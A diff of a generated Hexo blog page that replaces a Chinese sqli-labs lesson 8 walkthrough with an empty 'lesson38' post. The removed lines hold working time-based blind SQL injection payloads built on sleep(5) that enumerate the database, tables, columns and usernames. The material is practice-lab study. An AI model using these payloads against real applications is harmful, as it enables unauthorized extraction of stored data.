@@ -5,19 +5,16 @@
   
 
   
-  <title>lessen8 | Hexo</title>
+  <title>lesson38 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一.爆库首先输入—— 1?id&#x3D;1--+  页面回显you are in 接着打开源码查看到—— 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;  则注入点为 ‘   ，输入语句—— 1?id&#x3D;0&#39; or 1&#x3D;1--+  回显正确。那么这时我觉得">
-<meta property="og:type" content="article">
-<meta property="og:title" content="lessen8">
-<meta property="og:url" content="http://example.com/2020/12/13/blog%20i/index.html">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="lesson38">
+<meta property="og:url" content="http://example.com/2021/02/06/lesson38/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一.爆库首先输入—— 1?id&#x3D;1--+  页面回显you are in 接着打开源码查看到—— 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;  则注入点为 ‘   ，输入语句—— 1?id&#x3D;0&#39; or 1&#x3D;1--+  回显正确。那么这时我觉得">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-12-13T07:23:18.000Z">
-<meta property="article:modified_time" content="2021-01-30T14:46:52.228Z">
+<meta property="article:published_time" content="2021-02-06T14:44:20.000Z">
+<meta property="article:modified_time" content="2021-02-06T14:44:20.487Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="sqlilabs">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -67,10 +64,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-blog i" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="blog-lesson38" class="article article-type-blog" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/12/13/blog%20i/" class="article-date">
-  <time datetime="2020-12-13T07:23:18.000Z" itemprop="datePublished">2020-12-13</time>
+    <a href="/2021/02/06/lesson38/" class="article-date">
+  <time datetime="2021-02-06T14:44:20.000Z" itemprop="datePublished">2021-02-06</time>
 </a>
     
   </div>
@@ -81,7 +78,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      lessen8
+      lesson38
     </h1>
   
 
@@ -89,61 +86,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="一-爆库"><a href="#一-爆库" class="headerlink" title="一.爆库"></a>一.爆库</h4><p>首先输入——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1--+</span><br></pre></td></tr></table></figure>
-
-<p>页面回显you are in</p>
-<p>接着打开源码查看到——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>则注入点为 ‘   ，输入语句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; or 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
-
-<p>回显正确。那么这时我觉得这和lesson5有什么区别呢？查看源代码发现——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;print_r(mysql_error());</span><br></pre></td></tr></table></figure>
-
-<p>他对mysql报错语句进行了注释，即这关不能用报错注入。</p>
-<p>于是我用布尔盲注，我发现不管我输入语句判断正确与否他返回的都是you are in那么说明我们想要使用布尔盲注也是不行的。那么最后尝试一下时间盲注，输入语句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br><span class="line">或</span><br><span class="line">?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
-
-<p>发现可以行得通，那么本题使用时间盲注无疑了。</p>
-<h4 id="二-爆表"><a href="#二-爆表" class="headerlink" title="二.爆表"></a>二.爆表</h4><p>输入语句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
-
-<h4 id="三-爆列"><a href="#三-爆列" class="headerlink" title="三.爆列"></a>三.爆列</h4><p>输入语句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
-
-<h4 id="四-爆值"><a href="#四-爆值" class="headerlink" title="四.爆值"></a>四.爆值</h4><p>输入语句——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
-
-
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/13/blog%20i/" data-id="ckkrqc5c9000kn4vuc3xu7cie" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/06/lesson38/" data-id="ckkttwf5b0001bkvu8pn94aul" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
-
     </footer>
   </div>
   
     
 <nav id="article-nav">
   
-    <a href="/2020/12/13/blog%20j/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          lesson9、lesson10
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/02/06/lesson32-37/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">mysql</div>
+      <div class="article-nav-title">lesson32-37</div>
     </a>
   
 </nav>
